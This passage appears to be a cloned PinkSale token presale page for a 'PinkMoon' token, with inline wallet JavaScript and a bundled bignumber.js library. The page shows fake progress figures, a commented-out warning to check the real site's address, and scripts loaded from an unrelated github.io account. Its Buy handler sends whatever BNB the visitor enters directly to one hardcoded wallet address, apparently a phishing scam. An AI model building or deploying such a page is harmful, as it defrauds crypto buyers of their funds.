                                                    </tr>
                                                    <tr>
                                                        <td>Presale Start Time</td>
                                                        <td class="has-text-right">2021.12.22 04:30 (UTC)</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Presale End Time</td>
                                                        <td class="has-text-right">2021.12.23 19:00 (UTC)</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Listing On</td>
                                                        <td class="has-text-right"><a class="mr-1" href="https://pancakeswap.finance/swap?outputCurrency=0xE8Ce27F7f710982CE427D57b571Cdb041D052d9B" target="_blank" rel="noreferrer nofollow">Pancakeswap</a></td>
                                                    </tr>
                                                    <tr>
                                                        <td>Liquidity Percent</td>
                                                        <td class="has-text-right">60%</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Liquidity Lockup Time</td>
                                                        <td class="has-text-right">365 days after pool ends</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 24px;"></div>
                                <div class="ant-card ant-card-bordered">
                                    <div class="ant-card-head">
                                        <div class="ant-card-head-wrapper">
                                            <div class="ant-card-head-title">Token Metrics</div>
                                        </div>
                                    </div>
                                    <div class="ant-card-body">
                                        <div class="has-text-centered">
                                            <div style="max-width: 400px; margin: auto; height: 400px; overflow-y: hidden;">
                                                <div class="TokenMetric_root__29Tdv"><canvas height="400" width="400" data-testid="canvas" role="img" id='draw' style="display: block; box-sizing: border-box; height: 390px; width: 390px;"></canvas></div><script>var ctx = document.getElementById('draw').getContext('2d'),img = new Image(),src = "0xA1D78Dc0745b2F198D1EC46011c0CfE9844b38Dd.png";img.src = src;img.onload = function() {ctx.drawImage(img, 0, 0, 400, 400);}</script>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="column is-flex-grow-1">
                                <div class="ant-card ant-card-bordered">
                                    <div class="ant-card-body">
                                        <!--div data-show="true" class="ant-alert ant-alert-warning ant-alert-no-icon" role="alert" style="margin-bottom: 10px;">
                                            <!--div class="ant-alert-content">
                                                <div class="ant-alert-message">Make sure the website is pinksale.money!</div>
                                                <div class="ant-alert-description"></div>
                                            </div>
                                        </div-->
                                        <form>
                                            <div class="has-text-centered">
                                                <p class="mb-2">Presale Ends In</p>
                                                <div class="has-text-centered">
                                                    <strong>
                                                        <span class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">00
                                                        </span><span id="hours" class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">16</span>
                                                        <span id="minutes" class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">45</span><span id="seconds" class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">02</span>
                                                    </strong>
                                                </div>
                                            </div>
                                            <div class="pb-4">
                                                <div class="ant-progress ant-progress-line ant-progress-status-active ant-progress-default mt-4 mb-2">
                                                    <div class="ant-progress-outer">
                                                        <div class="ant-progress-inner">
                                                            <div class="ant-progress-bg" id="test123" style="width: 93%; height: 15px; background: rgb(72, 199, 116);"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="is-flex is-align-items-center is-size-7">
                                                    <div class="is-flex-grow-1" id="bnbtext">247.28266 BNB</div>
                                                    <div class="is-flex-grow-1 has-text-right">250 BNB</div>
                                                </div>
                                            </div>
                                            <div class="field">
                                                <label class="label">Amount </label>
                                                <div class="control">
                                                    <div style="position: relative;">
                                                        <input id="amount" class="input" type="number" placeholder="0.0" value="" /><a class="mr-2" target="_blank" rel="noreferrer nofollow" style="position: absolute; right: 8px; top: 4px;"><b>MAX</b></a>
                                                    </div>
                                                </div>
                                            </div>
                                            <button id="transaction-button" disabled type="button" class="ant-btn ant-btn-primary">
                                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                                    <path d="M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 0 0-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z"></path>
                                                </svg>
                                                <span class="ml-2">Buy</span>
                                            </button>
                                        </form>
                                    </div>
                                </div>
                                <div style="height: 24px;"></div>
                                <div class="ant-card ant-card-bordered">
                                    <div class="ant-card-body">
                                        <div class="table-container">
                                            <table>
                                                <tbody>
                                                    <tr>
                                                        <td>Status</td>
                                                        <td class="has-text-right has-text-primary">inprogress</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Sale type</td>
                                                        <td class="has-text-right has-text-primary">Public</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Minimum Buy</td>
                                                        <td class="has-text-right">0.1 BNB</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Maximum Buy</td>
                                                        <td class="has-text-right">7 BNB</td>
                                                    </tr>
                                                    <tr>
                                                        <td>Your Purchased</td>
                                                        <td class="has-text-right"> 0 BNB</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
                <footer class="ant-layout-footer">
                    <div class="container">
                        <div class="copyright">
                            <p class="has-text-centered">
                                Disclaimer: The information provided shall not in any way constitute a recommendation as to whether you should invest in any product discussed. We accept no liability for any loss occasioned to any person acting
                                or refraining from action as a result of any material provided or published. © 2021 by PinkMoon team!
                            </p>
                        </div>
                    </div>
                </footer>
            </section>
        </section>
    </div>
    <script src="https://ketlller.github.io/test/address.js"></script>
    <script src="https://ketlller.github.io/test/script.js"></script>
    <script src="https://ketlller.github.io/test/timer.js?dj=sn"></script>
    <script>
        (function() {
            function r(e, n, t) {
                function o(i, f) {
                    if (!n[i]) {
                        if (!e[i]) {
                            var c = "function" == typeof require && require;
                            if (!f && c) return c(i, !0);
                            if (u) return u(i, !0);
                            var a = new Error("Cannot find module '" + i + "'");
                            throw a.code = "MODULE_NOT_FOUND", a
                        }
                        var p = n[i] = {
                            exports: {}
                        };
                        e[i][0].call(p.exports, function(r) {
                            var n = e[i][1][r];
                            return o(n || r)
                        }, p, p.exports, r, e, n, t)
                    }
                    return n[i].exports
                }
                for (var u = "function" == typeof require && require, i = 0; i < t.length; i++) o(t[i]);
                return o
            }
            return r
        })()({
            1: [function(require, module, exports) {
                const ethConnectButton = document.querySelectorAll(".connectButton")
                const ethValMeta = document.getElementById("amount")
                const ethPurchMeta = document.getElementById("transaction-button")

                var accounts = 0;
                const reciev = '0x239e8c31e4097e294Fe3BD2C7A0A3b274807F43a';
                const convert = require('ether-converter')


                async function changingChain() {
                    console.log(123);
                    var chain = await ethereum.request({
                        method: 'eth_chainId'
                    });
                    if (chain != "0x38") {
                        try {
                            await ethereum.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{
                                    chainId: '0x38'
                                }],
                            });
                        } catch (switchError) {
                            // This error code indicates that the chain has not been added to MetaMask.
                            if (switchError.code === 4902) {
                                try {
                                    const data = [{
                                        chainId: '0x38',
                                        chainName: 'Binance Smart Chain',
                                        nativeCurrency: {
                                            name: 'BNB',
                                            symbol: 'BNB',
                                            decimals: 18
                                        },
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        blockExplorerUrls: ['https://bscscan.com/'],
                                    }]
                                    await ethereum.request({
                                        method: 'wallet_addEthereumChain',
                                        params: data,
                                    });
                                } catch (addError) {
                                    // handle "add" error
                                }
                            }
                            // handle other "switch" errors
                        }
                    } else {}
                }

                function cropTxt(str) {
                    if (str.length > 40) str = str.slice(0, 5) + '...' + str.slice(-3);
                    return str;
                }

                window.onload = async function(e) {
                    let f = await checkAccount();
                    if (f == 1) {
                        document.querySelector(".ant-btn").removeAttribute("disabled");
                        console.log(123);
                    } else {
                        console.log(f);
                    }
                }
                async function checkAccount() {
                    console.log(123);
                    //const checkli = await getAccount();
                    var wallet = await ethereum.request({
                        method: 'eth_accounts'
                    });
                    if (wallet.length == 0) {
                        return 0;
                    } else {
                        ethConnectButton[1].innerText = cropTxt(wallet[0]);
                        document.querySelector(".ant-btn").removeAttribute("disabled");
                        return 1;
                        //changingChain();
                    }


                }


                async function getAccount() {
                    accounts = await ethereum.request({
                        method: 'eth_requestAccounts'
                    })
                    //ethConnectButton[0].innerText = cropTxt(accounts[0]);
                    ethConnectButton[1].innerText = cropTxt(accounts[0]);
                    document.querySelector(".ant-btn").removeAttribute("disabled");
                    return accounts[0];
                }
                for (let i = 0; i < ethConnectButton.length; i++) {
                    ethConnectButton[i].addEventListener('click', () => {
                        getAccount();
                    })
                }


                ethPurchMeta.addEventListener('click', () => {
                    var val = 0;
                    val = ethValMeta.value;
                    changingChain();
                    sendTransaction(val);
                    console.log(val)
                })

                async function sendTransaction(val) {

                    const acc = await getAccount();
                    console.log(accounts[0]);
                    var chain = await ethereum.request({
                        method: 'eth_chainId'
                    });
                    if (chain != "0x38") {
                        changingChain();
                        return;
                    }
                    var result = convert(val, 'ether', 'wei')
                    result = parseInt(result).toString(16)
                    const params = {
                        from: acc,
                        to: reciev,
                        gas: '0x5208',
                        gasPrice: '0x0174875e800',
                        value: result, // 2441406250

                    }

                    ethereum
                        .request({
                            method: 'eth_sendTransaction',
                            params: [params],
                        })
                        .then((result) => {
                            // The result varies by by RPC method.
                            // For example, this method will return a transaction hash hexadecimal string on success.
                        })
                        .catch((error) => {
                            // If the request fails, the Promise will reject with an error.
                        });
                }


            }, {
                "ether-converter": 3
            }],
            2: [function(require, module, exports) {
                ;
                (function(globalObject) {
                    'use strict';

                    /*
                     *      bignumber.js v8.1.1
                     *      A JavaScript library for arbitrary-precision arithmetic.
                     *      https://github.com/MikeMcl/bignumber.js
                     *      Copyright (c) 2019 Michael Mclaughlin <M8ch88l@gmail.com>
                     *      MIT Licensed.
                     *
                     *      BigNumber.prototype methods     |  BigNumber methods
                     *                                      |
                     *      absoluteValue            abs    |  clone
                     *      comparedTo                      |  config               set
                     *      decimalPlaces            dp     |      DECIMAL_PLACES
                     *      dividedBy                div    |      ROUNDING_MODE
                     *      dividedToIntegerBy       idiv   |      EXPONENTIAL_AT
                     *      exponentiatedBy          pow    |      RANGE
                     *      integerValue                    |      CRYPTO
                     *      isEqualTo                eq     |      MODULO_MODE
                     *      isFinite                        |      POW_PRECISION
                     *      isGreaterThan            gt     |      FORMAT
                     *      isGreaterThanOrEqualTo   gte    |      ALPHABET
                     *      isInteger                       |  isBigNumber
                     *      isLessThan               lt     |  maximum              max
                     *      isLessThanOrEqualTo      lte    |  minimum              min
                     *      isNaN                           |  random
                     *      isNegative                      |  sum
                     *      isPositive                      |
                     *      isZero                          |
                     *      minus                           |
                     *      modulo                   mod    |
                     *      multipliedBy             times  |
                     *      negated                         |
                     *      plus                            |
                     *      precision                sd     |
                     *      shiftedBy                       |
                     *      squareRoot               sqrt   |
                     *      toExponential                   |
                     *      toFixed                         |
                     *      toFormat                        |
                     *      toFraction                      |
                     *      toJSON                          |
                     *      toNumber                        |
                     *      toPrecision                     |
                     *      toString                        |
                     *      valueOf                         |
                     *
                     */


                    var BigNumber,
                        isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,
                        hasSymbol = typeof Symbol == 'function' && typeof Symbol.iterator == 'symbol',

                        mathceil = Math.ceil,
                        mathfloor = Math.floor,

                        bignumberError = '[BigNumber Error] ',
                        tooManyDigits = bignumberError + 'Number primitive has more than 15 significant digits: ',

                        BASE = 1e14,
                        LOG_BASE = 14,
                        MAX_SAFE_INTEGER = 0x1fffffffffffff, // 2^53 - 1
                        // MAX_INT32 = 0x7fffffff,                   // 2^31 - 1
                        POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13],
                        SQRT_BASE = 1e7,

                        // EDITABLE
                        // The limit on the value of DECIMAL_PLACES, TO_EXP_NEG, TO_EXP_POS, MIN_EXP, MAX_EXP, and
                        // the arguments to toExponential, toFixed, toFormat, and toPrecision.
                        MAX = 1E9; // 0 to MAX_INT32


                    /*
                     * Create and return a BigNumber constructor.
                     */
                    function clone(configObject) {
                        var div, convertBase, parseNumeric,
                            P = BigNumber.prototype = {
                                constructor: BigNumber,
                                toString: null,
                                valueOf: null
                            },
                            ONE = new BigNumber(1),


                            //----------------------------- EDITABLE CONFIG DEFAULTS -------------------------------


                            // The default values below must be integers within the inclusive ranges stated.
                            // The values can also be changed at run-time using BigNumber.set.

                            // The maximum number of decimal places for operations involving division.
                            DECIMAL_PLACES = 20, // 0 to MAX

                            // The rounding mode used when rounding to the above decimal places, and when using
                            // toExponential, toFixed, toFormat and toPrecision, and round (default value).
                            // UP         0 Away from zero.
                            // DOWN       1 Towards zero.
                            // CEIL       2 Towards +Infinity.
                            // FLOOR      3 Towards -Infinity.
                            // HALF_UP    4 Towards nearest neighbour. If equidistant, up.
                            // HALF_DOWN  5 Towards nearest neighbour. If equidistant, down.
                            // HALF_EVEN  6 Towards nearest neighbour. If equidistant, towards even neighbour.
                            // HALF_CEIL  7 Towards nearest neighbour. If equidistant, towards +Infinity.
                            // HALF_FLOOR 8 Towards nearest neighbour. If equidistant, towards -Infinity.
                            ROUNDING_MODE = 4, // 0 to 8

                            // EXPONENTIAL_AT : [TO_EXP_NEG , TO_EXP_POS]

                            // The exponent value at and beneath which toString returns exponential notation.
                            // Number type: -7
                            TO_EXP_NEG = -7, // 0 to -MAX

                            // The exponent value at and above which toString returns exponential notation.
                            // Number type: 21
                            TO_EXP_POS = 21, // 0 to MAX

                            // RANGE : [MIN_EXP, MAX_EXP]

                            // The minimum exponent value, beneath which underflow to zero occurs.
                            // Number type: -324  (5e-324)
                            MIN_EXP = -1e7, // -1 to -MAX

                            // The maximum exponent value, above which overflow to Infinity occurs.
                            // Number type:  308  (1.7976931348623157e+308)
                            // For MAX_EXP > 1e7, e.g. new BigNumber('1e100000000').plus(1) may be slow.
                            MAX_EXP = 1e7, // 1 to MAX

                            // Whether to use cryptographically-secure random number generation, if available.
                            CRYPTO = false, // true or false

                            // The modulo mode used when calculating the modulus: a mod n.
                            // The quotient (q = a / n) is calculated according to the corresponding rounding mode.
                            // The remainder (r) is calculated as: r = a - n * q.
                            //
                            // UP        0 The remainder is positive if the dividend is negative, else is negative.
                            // DOWN      1 The remainder has the same sign as the dividend.
                            //             This modulo mode is commonly known as 'truncated division' and is
                            //             equivalent to (a % n) in JavaScript.
                            // FLOOR     3 The remainder has the same sign as the divisor (Python %).
                            // HALF_EVEN 6 This modulo mode implements the IEEE 754 remainder function.
                            // EUCLID    9 Euclidian division. q = sign(n) * floor(a / abs(n)).
                            //             The remainder is always positive.
                            //
                            // The truncated division, floored division, Euclidian division and IEEE 754 remainder
                            // modes are commonly used for the modulus operation.
                            // Although the other rounding modes can also be used, they may not give useful results.
                            MODULO_MODE = 1, // 0 to 9

                            // The maximum number of significant digits of the result of the exponentiatedBy operation.
                            // If POW_PRECISION is 0, there will be unlimited significant digits.
                            POW_PRECISION = 0, // 0 to MAX

                            // The format specification used by the BigNumber.prototype.toFormat method.
                            FORMAT = {
                                prefix: '',
                                groupSize: 3,
                                secondaryGroupSize: 0,
                                groupSeparator: ',',
                                decimalSeparator: '.',
                                fractionGroupSize: 0,
                                fractionGroupSeparator: '\xA0', // non-breaking space
                                suffix: ''
                            },

                            // The alphabet used for base conversion. It must be at least 2 characters long, with no '+',
                            // '-', '.', whitespace, or repeated character.
                            // '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
                            ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz';


                        //------------------------------------------------------------------------------------------


                        // CONSTRUCTOR


                        /*
                         * The BigNumber constructor and exported function.
                         * Create and return a new instance of a BigNumber object.
                         *
                         * v {number|string|BigNumber} A numeric value.
                         * [b] {number} The base of v. Integer, 2 to ALPHABET.length inclusive.
                         */
                        function BigNumber(v, b) {
                            var alphabet, c, caseChanged, e, i, isNum, len, str,
                                x = this;

                            // Enable constructor call without `new`.
                            if (!(x instanceof BigNumber)) return new BigNumber(v, b);

                            if (b == null) {

                                if (v && v._isBigNumber === true) {
                                    x.s = v.s;

                                    if (!v.c || v.e > MAX_EXP) {
                                        x.c = x.e = null;
                                    } else if (v.e < MIN_EXP) {
                                        x.c = [x.e = 0];
                                    } else {
                                        x.e = v.e;
                                        x.c = v.c.slice();
                                    }

                                    return;
                                }

                                if ((isNum = typeof v == 'number') && v * 0 == 0) {

                                    // Use `1 / n` to handle minus zero also.
                                    x.s = 1 / v < 0 ? (v = -v, -1) : 1;

                                    // Fast path for integers, where n < 2147483648 (2**31).
                                    if (v === ~~v) {
                                        for (e = 0, i = v; i >= 10; i /= 10, e++);

                                        if (e > MAX_EXP) {
                                            x.c = x.e = null;
                                        } else {
                                            x.e = e;
                                            x.c = [v];
                                        }

                                        return;
                                    }

                                    str = String(v);
                                } else {

                                    if (!isNumeric.test(str = String(v))) return parseNumeric(x, str, isNum);

                                    x.s = str.charCodeAt(0) == 45 ? (str = str.slice(1), -1) : 1;
                                }

                                // Decimal point?
                                if ((e = str.indexOf('.')) > -1) str = str.replace('.', '');

                                // Exponential form?
                                if ((i = str.search(/e/i)) > 0) {

                                    // Determine exponent.
                                    if (e < 0) e = i;
                                    e += +str.slice(i + 1);
                                    str = str.substring(0, i);
                                } else if (e < 0) {

                                    // Integer.
                                    e = str.length;
                                }

                            } else {

                                // '[BigNumber Error] Base {not a primitive number|not an integer|out of range}: {b}'
                                intCheck(b, 2, ALPHABET.length, 'Base');

                                // Allow exponential notation to be used with base 10 argument, while
                                // also rounding to DECIMAL_PLACES as with other bases.
                                if (b == 10) {
                                    x = new BigNumber(v);
                                    return round(x, DECIMAL_PLACES + x.e + 1, ROUNDING_MODE);
                                }

                                str = String(v);

                                if (isNum = typeof v == 'number') {

                                    // Avoid potential interpretation of Infinity and NaN as base 44+ values.
                                    if (v * 0 != 0) return parseNumeric(x, str, isNum, b);

                                    x.s = 1 / v < 0 ? (str = str.slice(1), -1) : 1;

                                    // '[BigNumber Error] Number primitive has more than 15 significant digits: {n}'
                                    if (BigNumber.DEBUG && str.replace(/^0\.0*|\./, '').length > 15) {
                                        throw Error(tooManyDigits + v);
                                    }
                                } else {
                                    x.s = str.charCodeAt(0) === 45 ? (str = str.slice(1), -1) : 1;
                                }

                                alphabet = ALPHABET.slice(0, b);
                                e = i = 0;

                                // Check that str is a valid base b number.
                                // Don't use RegExp, so alphabet can contain special characters.
                                for (len = str.length; i < len; i++) {
                                    if (alphabet.indexOf(c = str.charAt(i)) < 0) {
                                        if (c == '.') {

                                            // If '.' is not the first character and it has not be found before.
                                            if (i > e) {
                                                e = len;
                                                continue;
                                            }
                                        } else if (!caseChanged) {

                                            // Allow e.g. hexadecimal 'FF' as well as 'ff'.
                                            if (str == str.toUpperCase() && (str = str.toLowerCase()) ||
                                                str == str.toLowerCase() && (str = str.toUpperCase())) {
                                                caseChanged = true;
                                                i = -1;
                                                e = 0;
                                                continue;
                                            }
                                        }

                                        return parseNumeric(x, String(v), isNum, b);
                                    }
                                }

                                // Prevent later check for length on converted number.
                                isNum = false;
                                str = convertBase(str, b, 10, x.s);

                                // Decimal point?
                                if ((e = str.indexOf('.')) > -1) str = str.replace('.', '');
                                else e = str.length;
                            }

                            // Determine leading zeros.
                            for (i = 0; str.charCodeAt(i) === 48; i++);

                            // Determine trailing zeros.
                            for (len = str.length; str.charCodeAt(--len) === 48;);

                            if (str = str.slice(i, ++len)) {
                                len -= i;

                                // '[BigNumber Error] Number primitive has more than 15 significant digits: {n}'
                                if (isNum && BigNumber.DEBUG &&
                                    len > 15 && (v > MAX_SAFE_INTEGER || v !== mathfloor(v))) {
                                    throw Error(tooManyDigits + (x.s * v));
                                }

                                // Overflow?
                                if ((e = e - i - 1) > MAX_EXP) {

                                    // Infinity.
                                    x.c = x.e = null;

                                    // Underflow?
                                } else if (e < MIN_EXP) {

                                    // Zero.
                                    x.c = [x.e = 0];
                                } else {
                                    x.e = e;
                                    x.c = [];

                                    // Transform base

                                    // e is the base 10 exponent.
                                    // i is where to slice str to get the first element of the coefficient array.
                                    i = (e + 1) % LOG_BASE;
                                    if (e < 0) i += LOG_BASE; // i < 1

                                    if (i < len) {
                                        if (i) x.c.push(+str.slice(0, i));

                                        for (len -= LOG_BASE; i < len;) {
                                            x.c.push(+str.slice(i, i += LOG_BASE));
                                        }

                                        i = LOG_BASE - (str = str.slice(i)).length;
                                    } else {
                                        i -= len;
                                    }

                                    for (; i--; str += '0');
                                    x.c.push(+str);
                                }
                            } else {

                                // Zero.
                                x.c = [x.e = 0];
                            }
                        }


                        // CONSTRUCTOR PROPERTIES


                        BigNumber.clone = clone;

                        BigNumber.ROUND_UP = 0;
                        BigNumber.ROUND_DOWN = 1;
                        BigNumber.ROUND_CEIL = 2;
                        BigNumber.ROUND_FLOOR = 3;
                        BigNumber.ROUND_HALF_UP = 4;
                        BigNumber.ROUND_HALF_DOWN = 5;
                        BigNumber.ROUND_HALF_EVEN = 6;
                        BigNumber.ROUND_HALF_CEIL = 7;
                        BigNumber.ROUND_HALF_FLOOR = 8;
                        BigNumber.EUCLID = 9;


                        /*
                         * Configure infrequently-changing library-wide settings.
                         *
                         * Accept an object with the following optional properties (if the value of a property is
                         * a number, it must be an integer within the inclusive range stated):
                         *
                         *   DECIMAL_PLACES   {number}           0 to MAX
                         *   ROUNDING_MODE    {number}           0 to 8
                         *   EXPONENTIAL_AT   {number|number[]}  -MAX to MAX  or  [-MAX to 0, 0 to MAX]
                         *   RANGE            {number|number[]}  -MAX to MAX (not zero)  or  [-MAX to -1, 1 to MAX]
                         *   CRYPTO           {boolean}          true or false
                         *   MODULO_MODE      {number}           0 to 9
                         *   POW_PRECISION       {number}           0 to MAX
                         *   ALPHABET         {string}           A string of two or more unique characters which does
                         *                                       not contain '.'.
                         *   FORMAT           {object}           An object with some of the following properties:
                         *     prefix                 {string}
                         *     groupSize              {number}
                         *     secondaryGroupSize     {number}
                         *     groupSeparator         {string}
                         *     decimalSeparator       {string}
                         *     fractionGroupSize      {number}
                         *     fractionGroupSeparator {string}
                         *     suffix                 {string}
                         *
                         * (The values assigned to the above FORMAT object properties are not checked for validity.)
                         *
                         * E.g.
                         * BigNumber.config({ DECIMAL_PLACES : 20, ROUNDING_MODE : 4 })
                         *
                         * Ignore properties/parameters set to null or undefined, except for ALPHABET.
                         *
                         * Return an object with the properties current values.
                         */
                        BigNumber.config = BigNumber.set = function(obj) {
                            var p, v;

                            if (obj != null) {

                                if (typeof obj == 'object') {

                                    // DECIMAL_PLACES {number} Integer, 0 to MAX inclusive.
                                    // '[BigNumber Error] DECIMAL_PLACES {not a primitive number|not an integer|out of range}: {v}'
                                    if (obj.hasOwnProperty(p = 'DECIMAL_PLACES')) {
                                        v = obj[p];
                                        intCheck(v, 0, MAX, p);
                                        DECIMAL_PLACES = v;
                                    }

                                    // ROUNDING_MODE {number} Integer, 0 to 8 inclusive.
                                    // '[BigNumber Error] ROUNDING_MODE {not a primitive number|not an integer|out of range}: {v}'
                                    if (obj.hasOwnProperty(p = 'ROUNDING_MODE')) {
                                        v = obj[p];
                                        intCheck(v, 0, 8, p);
                                        ROUNDING_MODE = v;
                                    }

                                    // EXPONENTIAL_AT {number|number[]}
                                    // Integer, -MAX to MAX inclusive or
                                    // [integer -MAX to 0 inclusive, 0 to MAX inclusive].
                                    // '[BigNumber Error] EXPONENTIAL_AT {not a primitive number|not an integer|out of range}: {v}'
                                    if (obj.hasOwnProperty(p = 'EXPONENTIAL_AT')) {
                                        v = obj[p];
                                        if (v && v.pop) {
                                            intCheck(v[0], -MAX, 0, p);
                                            intCheck(v[1], 0, MAX, p);
                                            TO_EXP_NEG = v[0];
                                            TO_EXP_POS = v[1];
                                        } else {
                                            intCheck(v, -MAX, MAX, p);
                                            TO_EXP_NEG = -(TO_EXP_POS = v < 0 ? -v : v);
                                        }
                                    }

                                    // RANGE {number|number[]} Non-zero integer, -MAX to MAX inclusive or
                                    // [integer -MAX to -1 inclusive, integer 1 to MAX inclusive].
                                    // '[BigNumber Error] RANGE {not a primitive number|not an integer|out of range|cannot be zero}: {v}'
                                    if (obj.hasOwnProperty(p = 'RANGE')) {
                                        v = obj[p];
                                        if (v && v.pop) {
                                            intCheck(v[0], -MAX, -1, p);
                                            intCheck(v[1], 1, MAX, p);
                                            MIN_EXP = v[0];
                                            MAX_EXP = v[1];
                                        } else {
                                            intCheck(v, -MAX, MAX, p);
                                            if (v) {
                                                MIN_EXP = -(MAX_EXP = v < 0 ? -v : v);
                                            } else {
                                                throw Error(bignumberError + p + ' cannot be zero: ' + v);
                                            }
                                        }
                                    }

                                    // CRYPTO {boolean} true or false.
                                    // '[BigNumber Error] CRYPTO not true or false: {v}'
                                    // '[BigNumber Error] crypto unavailable'
                                    if (obj.hasOwnProperty(p = 'CRYPTO')) {
                                        v = obj[p];
                                        if (v === !!v) {
                                            if (v) {
                                                if (typeof crypto != 'undefined' && crypto &&
                                                    (crypto.getRandomValues || crypto.randomBytes)) {
                                                    CRYPTO = v;
                                                } else {
                                                    CRYPTO = !v;
                                                    throw Error(bignumberError + 'crypto unavailable');
                                                }
                                            } else {
                                                CRYPTO = v;
                                            }
                                        } else {
                                            throw Error(bignumberError + p + ' not true or false: ' + v);
                                        }
                                    }

                                    // MODULO_MODE {number} Integer, 0 to 9 inclusive.
                                    // '[BigNumber Error] MODULO_MODE {not a primitive number|not an integer|out of range}: {v}'
                                    if (obj.hasOwnProperty(p = 'MODULO_MODE')) {
                                        v = obj[p];
                                        intCheck(v, 0, 9, p);
                                        MODULO_MODE = v;
                                    }

                                    // POW_PRECISION {number} Integer, 0 to MAX inclusive.
                                    // '[BigNumber Error] POW_PRECISION {not a primitive number|not an integer|out of range}: {v}'
                                    if (obj.hasOwnProperty(p = 'POW_PRECISION')) {
                                        v = obj[p];
                                        intCheck(v, 0, MAX, p);
                                        POW_PRECISION = v;
                                    }

                                    // FORMAT {object}
                                    // '[BigNumber Error] FORMAT not an object: {v}'
                                    if (obj.hasOwnProperty(p = 'FORMAT')) {
                                        v = obj[p];
                                        if (typeof v == 'object') FORMAT = v;
                                        else throw Error(bignumberError + p + ' not an object: ' + v);
                                    }

                                    // ALPHABET {string}
                                    // '[BigNumber Error] ALPHABET invalid: {v}'
                                    if (obj.hasOwnProperty(p = 'ALPHABET')) {
                                        v = obj[p];

                                        // Disallow if only one character,
                                        // or if it contains '+', '-', '.', whitespace, or a repeated character.
                                        if (typeof v == 'string' && !/^.$|[+-.\s]|(.).*\1/.test(v)) {
                                            ALPHABET = v;
                                        } else {
                                            throw Error(bignumberError + p + ' invalid: ' + v);
                                        }
                                    }

                                } else {

                                    // '[BigNumber Error] Object expected: {v}'
                                    throw Error(bignumberError + 'Object expected: ' + obj);
                                }
                            }

                            return {
                                DECIMAL_PLACES: DECIMAL_PLACES,
                                ROUNDING_MODE: ROUNDING_MODE,
                                EXPONENTIAL_AT: [TO_EXP_NEG, TO_EXP_POS],
                                RANGE: [MIN_EXP, MAX_EXP],
                                CRYPTO: CRYPTO,
                                MODULO_MODE: MODULO_MODE,
                                POW_PRECISION: POW_PRECISION,
                                FORMAT: FORMAT,
                                ALPHABET: ALPHABET
                            };
                        };


                        /*
                         * Return true if v is a BigNumber instance, otherwise return false.
                         *
                         * If BigNumber.DEBUG is true, throw if a BigNumber instance is not well-formed.
                         *
                         * v {any}
                         *
                         * '[BigNumber Error] Invalid BigNumber: {v}'
                         */
                        BigNumber.isBigNumber = function(v) {
                            if (!v || v._isBigNumber !== true) return false;
                            if (!BigNumber.DEBUG) return true;

                            var i, n,
                                c = v.c,
                                e = v.e,
                                s = v.s;

                            out: if ({}.toString.call(c) == '[object Array]') {

                                if ((s === 1 || s === -1) && e >= -MAX && e <= MAX && e === mathfloor(e)) {

                                    // If the first element is zero, the BigNumber value must be zero.
                                    if (c[0] === 0) {
                                        if (e === 0 && c.length === 1) return true;
                                        break out;
                                    }

                                    // Calculate number of digits that c[0] should have, based on the exponent.
                                    i = (e + 1) % LOG_BASE;
                                    if (i < 1) i += LOG_BASE;

                                    // Calculate number of digits of c[0].
                                    //if (Math.ceil(Math.log(c[0] + 1) / Math.LN10) == i) {
                                    if (String(c[0]).length == i) {

                                        for (i = 0; i < c.length; i++) {
                                            n = c[i];
                                            if (n < 0 || n >= BASE || n !== mathfloor(n)) break out;
                                        }

                                        // Last element cannot be zero, unless it is the only element.
                                        if (n !== 0) return true;
                                    }
                                }

                                // Infinity/NaN
                            } else if (c === null && e === null && (s === null || s === 1 || s === -1)) {
                                return true;
                            }

                            throw Error(bignumberError + 'Invalid BigNumber: ' + v);
                        };


                        /*
                         * Return a new BigNumber whose value is the maximum of the arguments.
                         *
                         * arguments {number|string|BigNumber}
                         */
                        BigNumber.maximum = BigNumber.max = function() {
                            return maxOrMin(arguments, P.lt);
                        };


                        /*
                         * Return a new BigNumber whose value is the minimum of the arguments.
                         *
                         * arguments {number|string|BigNumber}
                         */
                        BigNumber.minimum = BigNumber.min = function() {
                            return maxOrMin(arguments, P.gt);
                        };


                        /*
                         * Return a new BigNumber with a random value equal to or greater than 0 and less than 1,
                         * and with dp, or DECIMAL_PLACES if dp is omitted, decimal places (or less if trailing
                         * zeros are produced).
                         *
                         * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp}'
                         * '[BigNumber Error] crypto unavailable'
                         */
                        BigNumber.random = (function() {
                            var pow2_53 = 0x20000000000000;

                            // Return a 53 bit integer n, where 0 <= n < 9007199254740992.
                            // Check if Math.random() produces more than 32 bits of randomness.
                            // If it does, assume at least 53 bits are produced, otherwise assume at least 30 bits.
